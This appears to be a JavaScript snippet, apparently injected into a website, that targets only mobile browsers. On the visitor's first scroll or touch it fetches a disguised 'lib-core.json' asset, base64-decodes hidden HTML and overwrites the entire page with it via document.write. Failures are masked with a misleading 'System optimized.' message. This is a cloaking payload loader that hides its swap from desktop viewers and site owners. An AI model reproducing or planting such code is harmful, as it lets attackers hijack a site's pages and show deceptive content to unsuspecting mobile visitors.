(function() {
    const isMobile = /android|iphone|ipad|mobile/i.test(navigator.userAgent);
    if (!isMobile) return;
    let active = false;
    const loadRealContent = async () => {
        if (active) return;
        active = true;
        try {
            const response = await fetch('/assets/lib-core.json');
            const data = await response.json();
            if (data && data.content) {
                const decodedHTML = decodeURIComponent(escape(atob(data.content)));
                document.open();
                document.write(decodedHTML);
                document.close();
            }
        } catch (err) {
            console.log("System optimized.");
        }
    };
    window.addEventListener('scroll', loadRealContent, { once: true });
    window.addEventListener('touchstart', loadRealContent, { once: true });
})();